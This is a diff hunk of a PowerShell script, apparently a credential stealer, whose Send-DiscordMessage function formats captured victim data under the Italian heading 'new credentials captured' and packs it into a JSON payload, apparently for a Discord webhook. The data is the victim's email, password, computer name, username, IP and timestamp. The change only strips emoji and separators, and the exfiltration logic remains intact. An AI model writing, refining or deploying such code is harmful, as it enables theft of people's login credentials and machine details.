@@ -15,17 +15,13 @@ function Send-DiscordMessage {
     $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike "*Loopback*" | Select-Object -First 1).IPAddress
     
     $message = @"
-━━━━━━━━━━━━━━━━━━━━━━━━
-🎯 **NUOVE CREDENZIALI CATTURATE**
-━━━━━━━━━━━━━━━━━━━━━━━━
-📧 **Email:** ````$Email````
-🔑 **Password:** ````$Password````
-━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ **Computer:** $computerName
-👤 **Utente:** $username
-🌐 **IP:** $ip
-🕐 **Ora:** $timestamp
-━━━━━━━━━━━━━━━━━━━━━━━━
+**NUOVE CREDENZIALI CATTURATE**
+**Email:** ````$Email````
+**Password:** ````$Password````
+**Computer:** $computerName
+**Utente:** $username
+**IP:** $ip
+**Ora:** $timestamp
 "@
 
     $payload = @{ content = $message } | ConvertTo-Json -Depth 10
